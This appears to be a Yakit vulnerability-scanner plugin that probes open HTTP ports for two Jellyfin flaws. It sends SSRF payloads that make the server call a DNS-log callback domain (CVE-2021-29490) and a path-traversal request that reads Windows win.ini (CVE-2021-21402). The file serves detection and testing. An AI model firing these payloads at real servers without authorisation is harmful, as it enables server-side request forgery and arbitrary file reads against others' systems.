# port scan plugin
yakit.AutoInitYakit()

// 准备发送的报文模版 
Packet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

`

//漏洞检测规则函数 
rules = []
addRule = func(packet,payload, check , riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "packet": packet,
        "payload": payload,
        "check": check,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}
addDynRule = func(payloadGenerator,riskType, riskTypeVerbose, severity,reference) {
    rules = append(rules, {
        "isDyn":true,
        "packet": Packet,
        "payloadGenerator": payloadGenerator,
        "type": riskType,
        "typeVerbose": riskTypeVerbose,
        "severity": severity,
        "reference":reference,
    })
}

//添加动态规则
addDynRule(()=>{
    server, token, dnserr = risk.NewDNSLogDomain()
    payload = str.f(`/Images/Remote?imageUrl=http://%v`, server)
    checker = (rsp,header,body)=>{
        sleep(5)
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            return true
        }
        return false
    }
    return payload,checker
},"SSRF","jellyfin-cve-2021-29490","high","https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96")

addDynRule(()=>{
    server, token, dnserr = risk.NewDNSLogDomain()
    payload = str.f(`/Items/RemoteSearch/Image?ImageUrl=http://%v&ProviderName=TheMovieDB`, server)
    checker = (rsp,header,body)=>{
        sleep(5)
        dnsdata, dnserr = risk.CheckDNSLogByToken(token)
        if len(dnsdata) > 0 {
            return true
        }
        return false
    }
    return payload,checker
},"SSRF","jellyfin-cve-2021-29490","high","https://github.com/jellyfin/jellyfin/security/advisories/GHSA-rgjw-4fwc-9v96")

addRule(Packet,`/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/`,func(rsp,header,body){
    if rsp.StatusCode == 200 && str.MatchAllOfSubString(body, `for 16-bit app support`) {
        return true
    }
    return false
},"任意文件读取","jellyfin-cve-2021-21402","high","https://blog.csdn.net/qq_41503511/article/details/116274406")



//漏洞检测handle 
handleRule = func(swg, isTls, addr, rule) {
    swg.Add()
    go func{
        defer swg.Done()

        defer func{
            recover()
        }
        println("start")
        if rule.isDyn{
            println("dyn")
            rule["payload"],rule["check"] = rule.payloadGenerator()
        }
        dump(rule["payload"])
        resp, req, err = poc.HTTP(rule["packet"], poc.https(isTls), poc.params({"target": addr, "payload": rule.payload}),poc.redirectTimes(0))
        if err != nil {
            yakit.Error("poc.HTTP error: %v", err)
            return
        }
        header, body = poc.Split(resp)
        rspIns, _ = poc.ParseBytesToHTTPResponse(resp)
        urlIns, _ = str.ExtractURLFromHTTPRequestRaw(req, isTls)
        url = urlIns.String()
        if rule.check(rspIns, header, body) {
            yakit.Info("FOUND INFO for %v", rule.typeVerbose)
            risk.NewRisk(
                url, risk.severity(rule.severity), 
                risk.title(sprintf("FOUND %v", rule.typeVerbose)),
                risk.titleVerbose(sprintf("reference %v", rule.reference)),
                risk.type(rule.type), risk.typeVerbose(rule.typeVerbose),
                risk.payload(rule.payload), risk.details({
                    "request": req,
                    "response": resp,
                    "url": url,
                }),
            )
            return
        }
        return
    }
}



handle = func(result) {
    if !result.IsOpen() {
        return
    }

    //判断是否是http
    if len(result.Fingerprint.HttpFlows) <= 0 {
        return
    }
    addr = str.HostPort(result.Target, result.Port)
    isTls = str.IsTLSServer(str.HostPort(result.Target, result.Port))

    // 漏洞检测
    swg = sync.NewSizedWaitGroup(10)
    for _, rule = range rules {
        handleRule(swg, isTls, addr, rule)
    }
    swg.Wait()
}
